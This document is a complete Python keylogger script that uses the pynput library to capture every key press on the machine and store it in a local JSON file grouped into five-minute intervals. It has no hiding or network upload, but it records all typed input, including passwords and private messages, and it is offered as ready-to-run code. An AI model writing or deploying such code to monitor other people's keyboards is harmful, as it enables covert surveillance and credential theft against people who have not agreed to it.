import json
import os
from datetime import datetime
from pynput import keyboard

log_file = "keylogger.json"


def log_to_json(timestamp, value):
    if not os.path.exists(log_file):
        with open(log_file, "w") as file:
            json.dump({}, file)

    try:
        with open(log_file, "r+") as file:
            try:
                data = json.load(file)
            except json.JSONDecodeError:
                data = {}

            if timestamp not in data:
                data[timestamp] = []
            data[timestamp].append(value)

            file.seek(0)
            json.dump(data, file, indent=4)
            file.truncate()
    except Exception as e:
        print(f"Error logging data: {e}")


def on_press(key):
    try:
        timestamp = get_5min_interval_timestamp(datetime.now())
        value = str(key.char) if hasattr(key, 'char') and key.char else str(key)
        log_to_json(timestamp, value)
    except Exception as e:
        print(f"Error handling key press: {e}")


def get_5min_interval_timestamp(dt):
    rounded_minute = (dt.minute // 5) * 5
    return dt.replace(minute=rounded_minute, second=0, microsecond=0).strftime("%Y-%m-%d %H:%M:%S")


def main():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    main()